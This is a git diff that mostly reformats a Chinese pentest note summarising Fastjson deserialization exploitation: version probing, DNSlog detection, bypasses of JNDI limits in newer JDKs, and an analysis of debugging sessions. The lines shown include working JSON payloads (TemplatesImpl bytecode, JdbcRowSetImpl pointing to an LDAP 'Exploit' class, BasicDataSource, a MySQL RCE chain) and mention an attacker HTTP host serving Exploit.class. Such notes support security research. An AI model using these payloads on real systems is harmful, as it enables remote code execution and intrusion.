@@ -1,8 +1,6 @@
 # Fastjson利用总结
 
 
-
-
 # 0X01 漏洞利用
 
 ## 探测fastjson
@@ -11,9 +9,9 @@
 
 使用`{"@type": "java.lang.AutoCloseable"`或者 `"{"a":x"`通过异常直接回显出版本号，接下来就直接根据版本号判断有没有漏洞和找exp了
 
-![image.png](https://s2.loli.net/2022/02/18/KVlEDSXBLtUce1m.png)
+<img src="https://s2.loli.net/2022/02/18/KVlEDSXBLtUce1m.png" title="" alt="image.png" data-align="center">
 
-![image.png](https://s2.loli.net/2022/02/18/mVFfvuL8i45owBK.png)
+<img src="https://s2.loli.net/2022/02/20/pEBv8NlifAXWRQ2.png" title="" alt="" data-align="center">
 
 **无回显使用dnslog探测POC：**
 
@@ -70,13 +68,10 @@ public class Exploit {
 ## 绕过高版本jdk对jndi注入的限制
 
 > 高版本jdk默认禁止jndi注入。
->
 
 > 所以基于jndi+RMI的利用需要JDK版本<=6u141、7u131、8u121，
->
 
 > 基于jndi+LDAP利用的JDK版本<=6u211、7u201、8u191、11.0.1
->
 
 ### **如何判断服务是否使用高版本jdk**
 
@@ -90,7 +85,7 @@ ldap收到请求重定向到[http://47.119.161.84:888/Exploit.class](http://47.1
 
 ldap服务收到了请求，可我们起的http服务却没有反应，也就访问不到我们的恶意类了。
 
-![image.png](https://s2.loli.net/2022/02/18/L7IE49BTDM18Hbm.png)
+![image-20220220011650815](https://s2.loli.net/2022/02/20/9AqWX87d1iIMxnB.png)
 
 所以实战情况下遇到上述情况（**ldap服务收到信息，却没有http请求**）多半可以断定是采用高版本jdk。
 
@@ -119,28 +114,27 @@ GitHub上的轮子：[https://github.com/veracode-research/rogue-jndi](https://g
 ## fastjson不出网与命令回显
 
 > 注：此攻击手法同样适用于高版本jdk下的利用
->
 
 1.2.24版本的三个POC：
 
 ```json
 1. 基于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
 {
-		"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
-		"_bytecodes":["poc_base64"],
-		'_name':'a.b',
-		'_tfactory':{ },
-		"_outputProperties":{},
-		"_name":"a",
-		"_version":"1.0",
-		"allowedProtocols":"all"
+        "@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",
+        "_bytecodes":["poc_base64"],
+        '_name':'a.b',
+        '_tfactory':{ },
+        "_outputProperties":{},
+        "_name":"a",
+        "_version":"1.0",
+        "allowedProtocols":"all"
 }
 2.基于com.sun.rowset.JdbcRowSetImpl（JNDI，用的最多）
 
 {
-		"@type":"com.sun.rowset.JdbcRowSetImpl", 
-		"dataSourceName":"ldap://localhost:1389/Exploit", 
-		"autoCommit":true
+        "@type":"com.sun.rowset.JdbcRowSetImpl", 
+        "dataSourceName":"ldap://localhost:1389/Exploit", 
+        "autoCommit":true
 }
 
 3.基于org.apache.tomcat.dbcp.dbcp.BasicDataSource
@@ -257,7 +251,7 @@ GitHub上的轮子：[https://github.com/veracode-research/rogue-jndi](https://g
 
 本地windows测试第一次成功写入，后面的只创建了文件并没有写入，需要刷新缓存或者重启服务才行
 
-![image.png](assets/image-20211105162445-kyda3kd.png)
+![image.png](https://s2.loli.net/2022/02/20/F2gBu9KofC48sDv.png)
 
 ### Mysql RCE
 
@@ -268,7 +262,6 @@ GitHub上的轮子：[https://github.com/veracode-research/rogue-jndi](https://g
 [https://dmsj-zjk.oss-cn-zhangjiakou.aliyuncs.com/share%2Fppt%2FBlackHat USA 2021%2Fus-21-Xing-How-I-Use-A-JSON-Deserialization.pdf?OSSAccessKeyId=LTAI4GKC6j39Agb66ieR44Ke&Expires=1629276415&Signature=jQ5O9EsNhlrXaLRbGAmDk7vrxDg%3D](https://dmsj-zjk.oss-cn-zhangjiakou.aliyuncs.com/share%2Fppt%2FBlackHat%20USA%202021%2Fus-21-Xing-How-I-Use-A-JSON-Deserialization.pdf?OSSAccessKeyId=LTAI4GKC6j39Agb66ieR44Ke&Expires=1629276415&Signature=jQ5O9EsNhlrXaLRbGAmDk7vrxDg%3D)
 
 ```csharp
-
 5.1.x(SSRF)，5.1.11-5.1.48(反序列化链)
 {
   "@type": "java.lang.AutoCloseable",
@@ -327,7 +320,6 @@ GitHub上的轮子：[https://github.com/veracode-research/rogue-jndi](https://g
 ![image.png](https://s2.loli.net/2022/02/18/N4lvJiDIOVxKbHg.png)
 
 > **以下为去年去年调试分析时的笔记，大量参考（拙劣模仿）了phith0n、kingx、mi1k7ea等师傅的文章，仅供参考。强烈建议阅读原文。文末有链接**
->
 
 # 0x02 调试分析
 
@@ -842,7 +834,6 @@ protected ConnectionFactory createConnectionFactory() throws SQLException {
 为true时，类加载后将会直接执行static{}块中的代码。 因为driverClassLoader和driverClassName
 
 都可以通过fastjson控制，所以只要找到一个可以利用的恶意类即可，com.sun.org.apache.bcel.internal.util.ClassLoader，这是一个神奇的ClassLoader，因为它会直接从classname中提取Class的bytecode数据。
-
 
 ![https://cdn.nlark.com/yuque/0/2020/png/244880/1605496447347-7a9f473d-829b-430b-b6a5-299dc5f14465.png#align=left&display=inline&height=428&margin=%5Bobject%20Object%5D&name=image.png&originHeight=855&originWidth=1806&size=89911&status=done&style=none&width=903](https://cdn.nlark.com/yuque/0/2020/png/244880/1605496447347-7a9f473d-829b-430b-b6a5-299dc5f14465.png#align=left&display=inline&height=428&margin=%5Bobject%20Object%5D&name=image.png&originHeight=855&originWidth=1806&size=89911&status=done&style=none&width=903)
 
